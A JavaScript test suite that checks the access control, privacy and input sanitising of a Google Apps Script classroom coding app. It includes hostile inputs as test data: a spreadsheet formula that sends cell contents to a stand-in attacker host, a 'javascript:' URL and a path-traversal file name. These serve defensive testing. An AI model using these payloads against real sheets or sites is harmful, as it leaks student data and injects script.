// Attacks gas/Code.gs the way a curious student with the browser console could.
import test from 'node:test';
import assert from 'node:assert/strict';
import { createServer } from './fake-gas.mjs';

const OWNER = 'teacher@school.test';
const OTHER = 'other.teacher@school.test';
const ARI = 'ari@school.test';
const BEA = 'bea@school.test';
const ZED = 'zed@school.test';
const STRANGER = 'stranger@school.test';

function setup() {
  const server = createServer({ owner: OWNER });
  const teacher = server.as(OWNER);
  const cls = teacher('createClass', 'Period 3');
  teacher('addStudents', cls.id, [`Ari M, ${ARI}`, `Bea T <${BEA}>`]);
  // Add a second teacher the way a person would: a row in the Teachers tab.
  server.sheets.get('Teachers').appendRow([OTHER, 'Other', '2026-01-01']);
  const other = server.as(OTHER);
  const clsB = other('createClass', 'Other class');
  other('addStudents', clsB.id, [ZED]);
  const ari = server.as(ARI);
  const bea = server.as(BEA);
  const zed = server.as(ZED);
  const ids = Object.fromEntries(teacher('listStudents', cls.id).map((s) => [s.username, s.id]));
  ari('saveWork', 't1', { code: 'ARI SECRET CODE', assets: {} });
  const beaWork = bea('submitWork', 't1', { code: 'BEA CODE', assets: {}, reflection: 'BEA REFLECTION', auto_ok: true });
  teacher('saveGrade', beaWork.id, { scores: { works: 4 }, total: 4, max_total: 12, feedback: 'PRIVATE FEEDBACK', status: 'approved' });
  return { server, teacher, other, ari, bea, zed, cls, clsB, ids, beaWork };
}
const denied = (fn) => assert.throws(fn);

test('only the two entry points can be called from a browser', () => {
  const { server } = setup();
  assert.deepEqual(server.publicFunctions().sort(), ['api', 'doGet']);
});

test('someone on no roster gets no access and no data', () => {
  const { server, cls } = setup();
  assert.equal(server.as(STRANGER)('session').role, null);
  for (const m of ['classBoard', 'myWorks', 'listClasses', 'arcade']) denied(() => server.as(STRANGER)(m, cls.id));
});

test('a signed-out request gets nothing', () => {
  const { server, cls } = setup();
  assert.equal(server.as('')('session').role, null);
  denied(() => server.as('')('classBoard', cls.id));
});

test('the deploying teacher becomes a teacher automatically, and email case does not matter', () => {
  const { server } = setup();
  assert.equal(server.as('TEACHER@school.test')('session').role, 'teacher');
  assert.equal(server.as('ARI@SCHOOL.TEST')('session').role, 'student');
});

test('a student cannot use any teacher action', () => {
  const { ari, cls, ids, beaWork } = setup();
  denied(() => ari('listClasses'));
  denied(() => ari('listStudents', cls.id));
  denied(() => ari('classWork', cls.id));
  denied(() => ari('getWorkFull', beaWork.id));
  denied(() => ari('saveGrade', beaWork.id, { status: 'approved' }));
  denied(() => ari('giveAward', ids[ARI], 'helper', ''));
  denied(() => ari('addStudents', cls.id, ['x@school.test']));
  denied(() => ari('removeStudent', ids[BEA]));
  denied(() => ari('setStudentPath', ids[ARI], 'arcade'));
  denied(() => ari('teacherUnshare', beaWork.id));
});

test('a student only ever receives their own code and grades', () => {
  const { ari, bea } = setup();
  const mine = ari('myWorks');
  assert.equal(mine.length, 1);
  assert.equal(mine[0].code, 'ARI SECRET CODE');
  assert.equal(mine[0].grade, null);
  assert.equal(bea('myWorks')[0].grade.feedback, 'PRIVATE FEEDBACK');
});

test('the class board shows progress but no code, grades, reflections, or emails', () => {
  const { ari, cls } = setup();
  const text = JSON.stringify(ari('classBoard', cls.id));
  for (const secret of ['BEA CODE', 'ARI SECRET', 'PRIVATE FEEDBACK', 'BEA REFLECTION', '@school.test']) assert.ok(!text.includes(secret), secret);
  assert.ok(text.includes('Bea T'));
});

test('a student cannot see another class', () => {
  const { zed, cls } = setup();
  denied(() => zed('classBoard', cls.id));
  denied(() => zed('arcade', cls.id));
  denied(() => zed('listSprites', cls.id));
});

test('a teacher cannot see or change another teacher\'s class', () => {
  const { other, cls, ids, beaWork } = setup();
  denied(() => other('getClass', cls.id));
  denied(() => other('listStudents', cls.id));
  denied(() => other('classBoard', cls.id));
  denied(() => other('classWork', cls.id));
  denied(() => other('getWorkFull', beaWork.id));
  denied(() => other('saveGrade', beaWork.id, { status: 'approved' }));
  denied(() => other('removeStudent', ids[ARI]));
  denied(() => other('deleteClass', cls.id));
  denied(() => other('addStudents', cls.id, ['x@school.test']));
  denied(() => other('giveAward', ids[ARI], 'helper', ''));
  assert.equal(other('listClasses').length, 1);
});

test('a student cannot approve their own work or forge fields', () => {
  const { ari, teacher, cls } = setup();
  const w = ari('saveWork', 't2', { code: 'x', assets: {}, status: 'approved', shared: true, student_id: 'someone-else', stretch_done: 99 });
  assert.equal(w.status, 'in_progress');
  assert.equal(w.shared, false);
  assert.equal(w.stretch_done, 3);
  const all = teacher('classWork', cls.id).filter((x) => x.lesson_id === 't2');
  assert.equal(all.length, 1);
  assert.notEqual(all[0].student_id, 'someone-else');
});

test('approved work is locked, and returned work can be fixed and resubmitted', () => {
  const { bea, teacher, beaWork } = setup();
  denied(() => bea('saveWork', 't1', { code: 'changed' }));
  denied(() => bea('submitWork', 't1', { code: 'changed' }));
  teacher('saveGrade', beaWork.id, { scores: {}, total: 1, max_total: 12, feedback: 'Fix it', status: 'returned' });
  assert.equal(bea('saveWork', 't1', { code: 'fixed', assets: {} }).status, 'returned');
  assert.equal(bea('submitWork', 't1', { code: 'fixed', assets: {} }).status, 'submitted');
});

test('a student can change their look but not their name, and picks a road only once', () => {
  const { ari, teacher, cls, ids } = setup();
  const s = ari('updateProfile', { avatar: { hat: 'cap' }, display_name: 'Hacker', class_id: 'x', email: 'bea@school.test', path: 'arcade', game_name: 'Mine' });
  assert.equal(s.display_name, 'Ari M');
  assert.equal(s.class_id, cls.id);
  assert.equal(s.avatar.hat, 'cap');
  assert.equal(ari('session').student.username, ARI);
  denied(() => ari('updateProfile', { path: 'platformer' }));
  denied(() => ari('updateProfile', { avatar: { junk: 'x'.repeat(3000) } }));
  teacher('setStudentPath', ids[ARI], 'platformer');
  assert.equal(ari('session').student.path, 'platformer');
});

test('nobody can inject a formula into the Sheet', () => {
  const { ari, teacher, cls } = setup();
  const formula = '=IMPORTXML("https://evil.test/?"&A1,"//a")';
  const w = ari('saveWork', 't3', { code: formula, assets: {}, reflection: formula });
  ari('updateProfile', { game_name: formula });
  teacher('addStudents', cls.id, [`=HYPERLINK("x"), new@school.test`]);
  teacher('createClass', formula);
  assert.equal(ari('myWorks').find((x) => x.id === w.id).reflection, formula);
  assert.equal(ari('session').student.game_name, formula);
});

test('long programs survive the 50,000 character cell limit, intact', () => {
  const { ari } = setup();
  const code = `// ${'x'.repeat(120000)}\n=weird`;
  ari('saveWork', 't4', { code, assets: { hero: 'data:image/png;base64,AAAA' } });
  const w = ari('myWorks').find((x) => x.lesson_id === 't4');
  assert.equal(w.code, code);
  assert.equal(w.assets.hero, 'data:image/png;base64,AAAA');
  denied(() => ari('saveWork', 't5', { code: 'x'.repeat(600000) }));
});

test('projects can hold extra code files, with safe names only', () => {
  const { ari, bea, cls, teacher } = setup();
  const files = { 'helpers.js': 'function hi() {}', 'sketch.js': 'x', '../evil.js': 'x', 'a b.js': 'x', 'notes.txt': 'x' };
  const saved = ari('saveWork', 't2', { code: 'hi();', assets: {}, files });
  assert.deepEqual(saved.files, { 'helpers.js': 'function hi() {}' });
  assert.equal(ari('myWorks').find((w) => w.lesson_id === 't2').files['helpers.js'], 'function hi() {}');
  const w = teacher('classWork', cls.id).find((x) => x.lesson_id === 't2');
  assert.equal(teacher('getWorkFull', w.id).files['helpers.js'], 'function hi() {}');
  ari('setShared', 't2', true);
  assert.equal(bea('arcade', cls.id).find((g) => g.lesson_id === 't2').files['helpers.js'], 'function hi() {}');
  const many = Object.fromEntries(Array.from({ length: 12 }, (_, i) => [`f${i}.js`, 'x']));
  assert.equal(Object.keys(ari('saveWork', 't3', { code: '', assets: {}, files: many }).files).length, 8);
});

test('special characters and quotes come back exactly', () => {
  const { ari } = setup();
  const code = 'text("héllo \\"é\\" 🎮", 1, 2);\n\t~tilde\n+plus\n@at';
  ari('saveWork', 't6', { code, assets: {}, reflection: '~leading tilde' });
  const w = ari('myWorks').find((x) => x.lesson_id === 't6');
  assert.equal(w.code, code);
  assert.equal(w.reflection, '~leading tilde');
});

test('reading the board does not load stored code', () => {
  const { server, ari, cls } = setup();
  ari('saveWork', 't2', { code: 'y'.repeat(100000), assets: {} });
  const works = server.sheets.get('Works');
  const orig = works.getRange.bind(works);
  let widest = 0;
  works.getRange = (r, c, nr, nc) => { widest = Math.max(widest, nc || 1); return orig(r, c, nr, nc); };
  ari('classBoard', cls.id);
  assert.ok(widest <= 14, `read ${widest} columns`);
});

test('a daily plan is the teacher\'s alone, and bad input is cleaned', () => {
  const { teacher, other, ari, cls } = setup();
  denied(() => ari('getClassPlan', cls.id));
  denied(() => ari('saveClassPlan', cls.id, { question: 'x' }));
  denied(() => other('getClassPlan', cls.id));
  denied(() => other('saveClassPlan', cls.id, { question: 'x' }));
  const saved = teacher('saveClassPlan', cls.id, { day: '2026-11-08', question: `=BAD()${'x'.repeat(400)}`, focus: 'Keep going', standards: ['6-8.CT.b.5', 'junk', '<b>'], timer_end: 'not a date' });
  assert.equal(saved.question.length, 200);
  assert.deepEqual(saved.standards, ['6-8.CT.b.5']);
  assert.equal(saved.timer_end, '');
  teacher('saveClassPlan', cls.id, { day: '2026-11-08', question: 'Second', timer_end: '2026-11-08T15:00:00Z' });
  const plan = teacher('getClassPlan', cls.id);
  assert.equal(plan.question, 'Second');
  assert.equal(plan.timer_end, '2026-11-08T15:00:00.000Z');
});

test('the class board gives dates for achievements, and still no private details', () => {
  const { ari, cls } = setup();
  const b = ari('classBoard', cls.id).find((s) => s.display_name === 'Bea T');
  assert.ok(b.works[0].submitted_at);
  assert.ok(!JSON.stringify(b).includes('PRIVATE FEEDBACK'));
});

test('sharing is visible inside the class only, and a teacher can take it down', () => {
  const { ari, bea, zed, teacher, cls } = setup();
  ari('setShared', 't1', true);
  const games = bea('arcade', cls.id);
  assert.equal(games.length, 1);
  assert.equal(games[0].code, 'ARI SECRET CODE');
  assert.equal(games[0].student.display_name, 'Ari M');
  assert.ok(!JSON.stringify(games).includes('@school.test'));
  denied(() => zed('arcade', cls.id));
  teacher('teacherUnshare', games[0].id);
  assert.equal(bea('arcade', cls.id).length, 0);
});

test('sprite rules: must be an image, owner edits, class sees published, teacher can remove', () => {
  const { ari, bea, zed, teacher, cls } = setup();
  const png = 'data:image/png;base64,AAAA';
  denied(() => ari('saveSprite', { name: 'bad', data_url: 'javascript:alert(1)' }));
  const s = ari('saveSprite', { name: 'hero', data_url: png, frames: 2, w: 16, h: 16, published: false });
  assert.equal(bea('listSprites', cls.id).length, 0);
  ari('saveSprite', { ...s, published: true });
  assert.equal(bea('listSprites', cls.id)[0].data_url, png);
  assert.equal(zed('mySprites').length, 0);
  denied(() => bea('saveSprite', { ...s, name: 'stolen' }));
  denied(() => bea('deleteSprite', s.id));
  const forged = bea('saveSprite', { name: 'mine', data_url: png, class_id: 'other', student_id: 'x', teacher_email: OWNER });
  assert.equal(forged.student_id, teacher('classBoard', cls.id).find((b) => b.display_name === 'Bea T').id);
  assert.equal(forged.class_id, cls.id);
  teacher('deleteSprite', s.id);
  assert.equal(ari('mySprites').length, 0);
});

test('rosters reject bad lines and duplicates without adding anyone', () => {
  const { teacher, cls } = setup();
  const before = teacher('listStudents', cls.id).length;
  denied(() => teacher('addStudents', cls.id, ['new1@school.test', 'no email here']));
  denied(() => teacher('addStudents', cls.id, ['new1@school.test', ARI]));
  denied(() => teacher('addStudents', cls.id, ['new1@school.test', 'NEW1@school.test']));
  denied(() => teacher('addStudents', cls.id, [OWNER]));
  assert.equal(teacher('listStudents', cls.id).length, before);
  teacher('addStudents', cls.id, ['Cam R\tcam@school.test', 'dee@school.test']);
  const names = teacher('listStudents', cls.id).map((s) => s.display_name);
  assert.ok(names.includes('Cam R') && names.includes('dee'));
});

test('removing a student deletes everything of theirs and ends their access', () => {
  const { server, ari, bea, teacher, cls, ids } = setup();
  ari('saveSprite', { name: 'h', data_url: 'data:image/png;base64,AA', published: true });
  teacher('giveAward', ids[ARI], 'helper', 'nice');
  teacher('removeStudent', ids[ARI]);
  assert.equal(server.as(ARI)('session').role, null);
  assert.equal(bea('listSprites', cls.id).length, 0);
  assert.ok(!teacher('classWork', cls.id).some((w) => w.student_id === ids[ARI]));
  assert.equal(server.sheets.get('Awards').getLastRow(), 1);
});

test('deleting a class removes its data, and leaves other classes alone', () => {
  const { server, teacher, other, zed, cls, clsB } = setup();
  zed('saveWork', 't1', { code: 'ZED', assets: {} });
  teacher('deleteClass', cls.id);
  assert.equal(server.as(ARI)('session').role, null);
  assert.equal(server.sheets.get('Grades').getLastRow(), 1);
  assert.equal(zed('myWorks')[0].code, 'ZED');
  assert.equal(other('listStudents', clsB.id).length, 1);
});

test('it also works as a standalone script, creating its own Sheet once', () => {
  const server = createServer({ owner: OWNER, bound: false });
  const t = server.as(OWNER);
  t('createClass', 'A');
  t('createClass', 'B');
  assert.equal(server.createdCount(), 1);
  assert.equal(t('listClasses').length, 2);
});
